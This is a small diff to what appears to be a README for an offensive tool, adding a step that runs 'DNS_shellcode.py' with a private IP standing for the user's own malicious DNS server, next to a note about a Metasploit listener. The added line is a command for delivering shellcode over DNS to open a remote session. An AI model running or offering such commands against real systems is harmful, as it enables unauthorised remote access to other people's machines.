@@ -18,7 +18,7 @@ listening msf
 
 ## setp.4
 Execute this python_scripts and input Your Bad_DNS_Server_IP
-
+- python DNS_shellcode.py -o 192.168.1.1
 
 ## 更新日志
 2020/2/12
